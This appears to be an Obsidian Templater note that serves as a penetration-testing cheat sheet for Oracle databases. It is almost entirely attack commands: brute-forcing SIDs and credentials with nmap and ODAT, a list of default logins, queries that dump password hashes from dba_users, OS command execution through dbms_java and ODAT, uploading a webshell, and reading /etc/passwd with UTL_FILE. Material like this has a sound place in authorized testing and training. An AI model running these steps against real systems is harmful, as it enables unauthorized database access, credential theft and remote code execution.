# Oracle DB — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 1521; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>' -%>

---

## Nmap
```bash
nmap -p<% port %> --script=oracle-tns-version,oracle-sid-brute,oracle-brute <% ip %>
```

```bash
nmap -p<% port %> --script=oracle-sid-brute <% ip %>
```

---

## SID Enumeration (required before connecting)
```bash
# Nmap SID brute
nmap -p<% port %> --script=oracle-sid-brute <% ip %>
```

```bash
# tnscmd10g
tnscmd10g version -h <% ip %> -p <% port %>
tnscmd10g status -h <% ip %> -p <% port %>
```

```bash
# ODAT (Oracle Database Attacking Tool)
odat sidguesser -s <% ip %> -p <% port %>
```

```bash
# MSF SID guesser
# use auxiliary/scanner/oracle/sid_brute
```

---

## Connect

### sqlplus (requires Oracle client)
```bash
sqlplus <% user %>/<% pass %>@<% ip %>:<% port %>/<sid>
```

```bash
# With SYS as SYSDBA (if default creds work)
sqlplus sys/oracle@<% ip %>:<% port %>/<sid> as sysdba
```

### ODAT (full-featured attack tool)
```bash
odat all -s <% ip %> -p <% port %> -d <sid> -U <% user %> -P '<% pass %>'
```

### Impacket (via TSS/TNS)
```bash
# No native impacket oracle — use odat or sqlplus
```

---

## Default Credentials to Try
```
sys / change_on_install
system / manager
dbsnmp / dbsnmp
scott / tiger
hr / hr
sysman / sysman
outln / outln
```

```bash
# ODAT credential guesser
odat passwordguesser -s <% ip %> -p <% port %> -d <sid> --accounts-file /usr/share/odat/accounts/accounts.txt
```

```bash
# Nmap Oracle brute
nmap -p<% port %> --script=oracle-brute --script-args oracle-brute.sid=<sid> <% ip %>
```

---

## Enumeration (inside sqlplus)
```sql
-- Version
SELECT * FROM v$version;

-- Current user
SELECT user FROM dual;

-- All users / schemas
SELECT username FROM all_users ORDER BY username;

-- Privileges
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;
SELECT grantee, granted_role FROM dba_role_privs WHERE grantee = 'SYS';

-- All tables accessible
SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;

-- Tables in current schema
SELECT table_name FROM user_tables;

-- Query table
SELECT * FROM <table> WHERE ROWNUM <= 20;

-- DBA users (requires DBA priv)
SELECT username, password, account_status FROM dba_users;
```

---

## OS Command Execution (if DBA / SYSDBA)
```sql
-- Java exec (requires JAVA privilege)
EXEC dbms_java.set_output(100000);
EXEC dbms_java.grant_permission('PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete');

SELECT dbms_java.runjava('oracle/aurora/util/Wrapper /bin/bash -c id > /tmp/out.txt') FROM dual;
```

```bash
# ODAT OS command execution
odat externaltable -s <% ip %> -p <% port %> -d <sid> -U <% user %> -P '<% pass %>' --exec /bin/bash -c 'id > /tmp/out'
```

```bash
# ODAT upload file
odat utlfile -s <% ip %> -p <% port %> -d <sid> -U <% user %> -P '<% pass %>' --putFile /tmp webshell.php /local/webshell.php
```

---

## File Read
```sql
-- UTL_FILE read (if granted)
DECLARE
  v_file UTL_FILE.FILE_TYPE;
  v_line VARCHAR2(4000);
BEGIN
  v_file := UTL_FILE.FOPEN('/etc', 'passwd', 'R');
  LOOP
    UTL_FILE.GET_LINE(v_file, v_line);
    DBMS_OUTPUT.PUT_LINE(v_line);
  END LOOP;
EXCEPTION WHEN NO_DATA_FOUND THEN
  UTL_FILE.FCLOSE(v_file);
END;
/
```

---

## TNS Poison (CVE-2012-1675 — older versions)
```bash
# MSF
# use auxiliary/admin/oracle/tnscmd
```

---

## Config Locations
```
$ORACLE_HOME/network/admin/tnsnames.ora     — connection definitions
$ORACLE_HOME/network/admin/listener.ora     — listener config
/etc/oratab                                 — installed databases
$ORACLE_HOME/rdbms/audit/                   — audit logs
```

---

## Notes
